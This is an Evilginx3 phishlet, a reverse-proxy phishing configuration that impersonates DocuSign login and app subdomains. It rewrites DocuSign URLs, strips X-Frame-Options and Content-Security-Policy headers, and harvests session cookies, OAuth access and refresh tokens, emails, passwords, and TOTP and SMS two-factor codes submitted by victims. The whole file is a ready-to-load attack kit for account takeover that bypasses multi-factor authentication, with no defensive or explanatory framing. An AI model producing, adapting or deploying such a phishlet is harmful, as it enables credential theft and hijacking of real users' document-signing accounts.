min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://account.docusign.com/'

proxy_hosts:
  - {phish_sub: 'account', orig_sub: 'account', domain: 'docusign.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'app', orig_sub: 'app', domain: 'docusign.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'demo', orig_sub: 'demo', domain: 'docusign.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'docusign.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'docusign.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  # Replace DocuSign domain URLs
  - {triggers_on: 'account.docusign.com', orig_sub: 'account', domain: 'docusign.com', search: 'https://account\\.docusign\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'account.docusign.com', orig_sub: 'app', domain: 'docusign.com', search: 'https://app\\.docusign\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'account.docusign.com', orig_sub: 'demo', domain: 'docusign.net', search: 'https://demo\\.docusign\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'account.docusign.com', orig_sub: 'api', domain: 'docusign.com', search: 'https://api\\.docusign\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'account.docusign.com', orig_sub: 'www', domain: 'docusign.com', search: 'https://www\\.docusign\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Remove security headers
  - {triggers_on: 'account.docusign.com', orig_sub: 'account', domain: 'docusign.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'account.docusign.com', orig_sub: 'account', domain: 'docusign.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'account.docusign.com', orig_sub: 'app', domain: 'docusign.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'account.docusign.com', orig_sub: 'app', domain: 'docusign.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary DocuSign authentication cookies
  - domain: '.docusign.com'
    keys: ['JSESSIONID', 'AuthToken', 'DSESSIONID', 'esign_session', 'esign_session_ss']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.docusign.com'
    keys: ['X-DocuSign-Authentication', 'X-DocuSign-Session', 'X-DocuSign-User']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.docusign.com'
    keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
    type: 'cookie'
    optional: true
  
  # Account and user cookies
  - domain: '.docusign.com'
    keys: ['account_id', 'user_id', 'account_name']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totp_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/home'
  - '^/envelopes'
  - '^/templates'
  - '^/settings'
  - '^/account'
  - '^/manage'

login:
  domain: 'account.docusign.com'
  path: '/login'

